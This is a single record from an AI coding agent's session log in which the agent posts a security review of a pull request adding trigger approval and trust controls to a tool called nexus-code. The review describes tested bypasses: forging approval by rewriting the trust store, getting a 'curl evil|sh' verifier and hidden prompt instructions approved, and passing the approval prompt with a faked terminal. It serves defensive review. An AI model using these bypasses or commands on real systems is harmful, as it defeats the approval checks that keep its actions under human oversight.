{"parentUuid":"066cda59-429b-42bb-9a65-413de75964b0","isSidechain":false,"message":{"model":"claude-sonnet-5-5","id":"msg_011ChNez3xeHx3gMXp5watDd","type":"message","role":"assistant","content":[{"type":"tool_use","id":"toolu_013eNw1uciBxqr6obXeDfjG5","name":"Bash","input":{"command":"cd ~/nexus-code && cat > /tmp/claude-1000/-home-mike-nexus-code/43bcbb67-2cff-4fa8-a05e-f8aa598df73b/scratchpad/rev803.md <<'EOF'\n**Independent hostile security review at `4dd93530c4e0fa3da5527d44a9cb668241bca055` — REQUEST CHANGES.** (BG-3 is now in scope for v1.3.0, so this trust model will be the authority boundary of the firer.) `git log origin/release/v1.3.0..HEAD` shows only the two PR commits and the diff is exactly the ten files. Spec parsing held up (duplicate keys, BOM, `__proto__`, deep nesting, `1e999`, 0 and out-of-range numbers, `..`, backslash and Unicode ids all rejected), the store fails closed on corrupt, 0644 and symlinked files, and all the gates and 60 new tests pass. The defects are in the trust store's protection, the approval display and the rate limiter; each was run.\n\n**Blocking**\n1. **The trust store is not a protected path.** `cli/src/security.ts:163-174` lists `extension_trust.json`, `trusted_workspaces.json` and `hooks.json`, not `trigger_trust.json` (`isPathProtected` returns `protected:false`). An in-place rewrite, which is what `edit_file` does, forged an approval: mode stayed 0600, `triggers status` said MATCH and \"may run: yes\". Reachable when the workspace is `$HOME` or the tool can write outside the workspace.\n2. **`approve` hides what the spec does** (`triggers_cli.ts:187-191`): it prints kind, id, policy, bounds and the prompt cut to 100 characters, never `action.verifier`, `event.paths`, `allowedOrigins`, the rate, or whether a secret is set. A spec with `verifier:\"curl evil|sh\"` and instructions after character 100 was approved on that display.\n3. **Rate limiter** (`trigger_rate_limit.ts`): denied attempts are kept and re-parsed with `new Date()` on every call (`:147-176`): 3,000 attempts took 3.9 s (CPU DoS); denied attempts count toward the window, so one probe every 30 minutes kept a 1/day trigger locked out for 24 h; the `limiters` map reached 50,000 entries and `limiterFor` ignores the workspace and returns a stale limiter after a re-approved spec changes the rate (`:199-206`).\n4. **`restore()` fails open on tampered state:** a quarantine with `until:\"garbage\"` admitted the next attempt (`now < Invalid Date` is false); a restored rate of `Infinity` admitted 1,000 of 1,000.\n5. **The workspace cap is never enforced:** `checkAndRecord` never consults `WorkspaceRateLimiter`; 100 triggers firing returned `workspaceWithinLimits:true`.\n\n**Non-blocking:** a faked terminal (`echo y | script -qec \"nexus triggers approve\"`) approves — the documented unsandboxed limit, but `docs/TRIGGERS.md` never says it; no `--yes` or env path exists; `--sandbox` reachability not tested. Docs vs code: the documented example fails to parse (each trigger needs `format` and `version`), `nexus triggers release` is documented but not built, the id rule differs, duplicate ids are not rejected (both approved, one kept), a bad third spec still let approval proceed for the others, and the docs say the key is the file's SHA-256 while the code keys on each spec's canonical hash. The spec file must be mode 0600 (`triggers_cli.ts:74`), so a git checkout (0644) is refused by list and approve, and the CLI shows only `NEW`, discarding the reason. `NEXUS_TRUST_WORKSPACE=1` grants trigger trust and `status` said \"may run: yes\" for an untrusted workspace. A secret of `a` is accepted and sits in the repository file.\n\n**What the firer must add:** re-parse the spec bytes once and fire exactly what was hashed; reject duplicate ids and paths that resolve outside the workspace (symlinks); webhook paths relative only; rate and quarantine checks after authentication and before body parsing; a body-size cap; loopback bind by default; HMAC over the body plus a timestamp/nonce for replay protection; the secret out of the repository (environment or keychain); Origin is not authentication; persist limiter state privately with validation; check the workspace cap; exclude `.nexus/triggers.json` and `.git` from file-change events; re-check trust at fire time; run with unattended defaults.\n**Tests at that head:** new files 21, 15, 13, 11; `leak_guard` 6, `check_requirements` 28, `security` 14, `workspace_trust` 5, `hooks_self_approval` 10, `protocol_schema` 8; `tsc`, the complexity gate, invariants and doc versions clean. **Mutations:** no terminal, skip hash in spec, workspace-trust gate, `approveTrigger` gate, quarantine: caught; skip hash in CLI list and skipping a corrupt entry: survived; 0644 store accepted: unverified. Not checked: `--sandbox` reachability, other-uid stores, a real listener (there is none), Node 22.\nEOF\ngh pr comment 803 --body-file /tmp/claude-1000/-home-mike-nexus-code/43bcbb67-2cff-4fa8-a05e-f8aa598df73b/scratchpad/rev803.md | tail -1; gh pr view 803 --json headRefName --jq .headRefName; gh pr view 798 --json headRefOid --jq '.headRefOid[0:8]'; gh pr view 798 --json comments --jq '.comments[-1].body[0:300]'","description":"Post the BG-3 trust review and read the branch name and the latest HK-3 comment"},"caller":{"type":"direct"}}],"container":null,"stop_reason":"tool_use","stop_sequence":null,"stop_details":null,"usage":{"input_tokens":2,"cache_creation_input_tokens":1709,"cache_read_input_tokens":367636,"output_tokens":2369,"output_tokens_details":{"thinking_tokens":286},"server_tool_use":{"web_search_requests":0,"web_fetch_requests":0},"service_tier":"standard","cache_creation":{"ephemeral_1h_input_tokens":0,"ephemeral_5m_input_tokens":1709},"inference_geo":"global","iterations":[{"input_tokens":2,"output_tokens":2369,"cache_read_input_tokens":367636,"cache_creation_input_tokens":1709,"cache_creation":{"ephemeral_5m_input_tokens":1709,"ephemeral_1h_input_tokens":0},"type